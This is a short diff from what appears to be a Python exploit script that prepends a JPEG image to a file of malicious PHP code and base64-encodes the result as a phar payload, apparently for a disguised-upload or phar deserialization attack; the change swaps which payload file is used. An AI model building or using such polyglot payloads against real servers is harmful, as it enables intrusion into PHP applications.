@@ -9,7 +9,7 @@ with open('iphone.jpeg', 'rb') as f:
     picture_data = f.read()
 
 #malicious_payload_data = Path('simple_malicious_code.txt').read_text().encode()
-malicious_payload_data = Path('malicious_code.txt').read_text().encode()
+malicious_payload_data = Path('malicious_php_code.txt').read_text().encode()
 
 phar_payload = base64.b64encode(picture_data + malicious_payload_data).decode()
 
